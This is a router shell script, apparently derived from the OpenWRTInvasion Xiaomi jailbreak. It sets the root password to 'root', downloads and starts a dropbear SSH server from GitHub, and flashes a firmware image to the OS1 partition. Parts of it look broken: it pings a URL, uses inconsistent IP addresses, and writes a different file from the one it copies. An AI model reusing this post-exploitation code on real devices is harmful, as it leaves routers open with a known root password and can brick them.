#!/bin/ash

set -euo pipefail

ping_chk()
{
    if [ -z "$1" ]; then
        echo "Ping network chk error! [URL isn't a nullable value]"
    else
        ping -c 1 -W 1 $1
        
        if [ $? -eq 0 ]; then
            echo "Ping network check [$1] success!" >> /tmp/script_debug
        else
            echo "Ping network check [$1] failed!" >> /tmp/script_debug
        fi
    fi
}

setup_password() {
    # Override existing password, as the default one set by xiaomi is unknown
    # https://www.systutorials.com/changing-linux-users-password-in-one-command-line/
    echo -e "root\nroot" | passwd root
}

start_ssh() {
    cd /tmp

    # Clean
    rm -rf dropbear
    rm -rf dropbear.tar.bz2
    rm -rf /etc/dropbear

    # kill/stop dropbear, in case it is running from a previous execution
    pgrep dropbear | xargs kill || true

    # Donwload dropbear static mipsel binary
    curl -L "https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/dropbearStaticMipsel.tar.bz2" --output dropbear.tar.bz2
    mkdir dropbear
    /tmp/busybox tar xvfj dropbear.tar.bz2 -C dropbear --strip-components=1

    # Add keys
    # http://www.ibiblio.org/elemental/howto/dropbear-ssh.html
    mkdir -p /etc/dropbear
    cd /etc/dropbear
    /tmp/dropbear/dropbearkey -t rsa -f dropbear_rsa_host_key
    /tmp/dropbear/dropbearkey -t dss -f dropbear_dss_host_key

    # Start SSH server
    /tmp/dropbear/dropbear

    # https://unix.stackexchange.com/a/402749
    # Login with ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@192.168.0.21
}

exploit() {
    echo "Start download Danbi FW..." > /tmp/script_debug

    ping_chk "8.8.8.8"
    ping_chk "https://fwdown.s3.ap-northeast-2.amazonaws.com"

    setup_password
    echo "Password setting finish..." >> /tmp/script_debug
    start_ssh
    echo "SSH setting finish..." >> /tmp/script_debug

    scp "~/work/dev/firmware/mir4ag-V2.3.5.bin" "root@192.168.31.1:/tmp/"
    echo $? >> /tmp/script_debug

    echo "$(ssh -i /lib/danbi_router.dbear root@192.168.9.1 'ls -al /tmp/mir4ag-V2.3.5.bin')" >> /tmp/script_debug

    echo "Done download Danbi FW...FW update start..." >> /tmp/script_debug

    mtd -e OS1 -r write /tmp/danbi_fw.bin OS1
    echo $? >> /tmp/script_debug
}

# From https://stackoverflow.com/a/16159057
"$@"